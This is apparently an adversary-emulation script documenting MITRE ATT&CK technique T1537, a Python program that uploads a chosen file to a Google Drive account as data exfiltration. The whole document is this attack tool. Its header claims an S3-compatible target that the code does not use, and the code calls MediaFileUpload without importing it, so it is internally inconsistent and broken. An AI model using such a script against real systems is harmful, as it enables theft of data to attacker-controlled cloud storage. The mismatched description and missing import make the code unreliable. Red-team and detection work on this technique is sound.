# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1537 - Transfer Data to Cloud Account
# Objective: Exfiltrate data by transferring it to a cloud storage account. 
# This script demonstrates uploading a file to a generic S3-compatible object storage endpoint. 
# This could be AWS S3, MinIO, or another compatible service.

#!/usr/bin/env python3
import os
import argparse
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow

def upload_to_google_drive(file_path, credentials_path='credentials.json'):
    SCOPES = ['https://www.googleapis.com/auth/drive.file']
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(credentials_path, SCOPES)
            creds = flow.run_local_server(port=0)
        with open('token.json', 'w') as token:
            token.write(creds.to_json())
    
    service = build('drive', 'v3', credentials=creds)
    file_metadata = {'name': os.path.basename(file_path)}
    media = MediaFileUpload(file_path, resumable=True)
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"[+] File uploaded to Google Drive with ID: {file.get('id')}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="T1537: Upload file to Google Drive")
    parser.add_argument("--file", required=True, help="File to upload")
    args = parser.parse_args()
    upload_to_google_drive(args.file)